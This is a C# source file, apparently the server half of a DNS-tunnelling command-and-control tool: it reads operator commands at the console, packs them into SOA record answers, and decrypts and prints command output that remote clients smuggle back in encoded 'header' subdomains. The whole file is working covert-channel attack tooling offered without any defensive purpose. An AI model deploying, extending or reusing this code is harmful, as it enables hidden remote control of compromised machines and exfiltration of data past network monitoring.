using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ARSoft.Tools.Net.Dns;
using ARSoft.Tools.Net;
using System.Threading.Tasks;

namespace DNSServer
{
    class Program
    {
        static List<string> sendDate = new List<string> { };
        static void Main(string[] args)
        {
            var maxConnection = 100;
            DnsServer dnsServer = new DnsServer(maxConnection, maxConnection);
            dnsServer.QueryReceived += DnsServer_QueryReceived;
            dnsServer.Start();
            while (true)
            {              
                Console.WriteLine("请输入命令：");
                Options.command = Console.ReadLine();
                Options.readline = false;
                //Console.WriteLine(Options.command);
                while (true)
                {
                    if (Options.readline)
                        break;
                }
            }
            Console.Read();
        }
        private static Task DnsServer_QueryReceived(object sender, QueryReceivedEventArgs eventArgs)
        {
            eventArgs.Query.IsQuery = false;
            DnsMessage query = eventArgs.Query as DnsMessage;
            if (query == null || query.Questions.Count <= 0)
                query.ReturnCode = ReturnCode.ServerFailure;
            else
            {
                if (query.Questions[0].RecordType == RecordType.Soa)
                {

                    foreach (DnsQuestion dnsQuestion in query.Questions)
                    {
                        if (Options.command != "header")
                        {
                            Options.flag = "true";
                            sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
                        }
                        string domainName = dnsQuestion.Name.ToString().Remove(dnsQuestion.Name.ToString().Length - 1,1);
                        if (domainName.StartsWith("header"))
                        {
                            Options.cmd5 = domainName.Split('.')[1];
                            foreach (string subdomain in domainName.Split('.').ToList().GetRange(2, domainName.Split('.').Length - 4))
                            {
                                Options.recDate.Add(subdomain);
                            }
                            //Console.WriteLine(domainName.Split('.').ToString().Substring(2, domainName.Split('.').ToString().Length - 2));
                        }
                        //Console.WriteLine("SOA请求");
                        if (Options.cmd5 == GetMD5Hash(string.Join("", Options.recDate)))
                        {
                            Console.WriteLine(Encoding.UTF8.GetString(Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.recDate)))));
                            Options.readline = true;
                            Options.recDate.Clear();
                        }
                        //Console.WriteLine(Options.cmd5);
                        SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), 4, 4, 4, 4, 4);
                        query.AnswerRecords.Add(soaRecord);
                        Options.flag = "fasle";
                        Options.command = "header";
                    }
                }
            }
            eventArgs.Response = eventArgs.Query;
            return Task.FromResult(0);
        }


        public static string GetMD5Hash(string bytedata)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(Encoding.UTF8.GetBytes(bytedata));
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                //Console.WriteLine(sBuilder.ToString());
                return sBuilder.ToString();
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }
    }
}
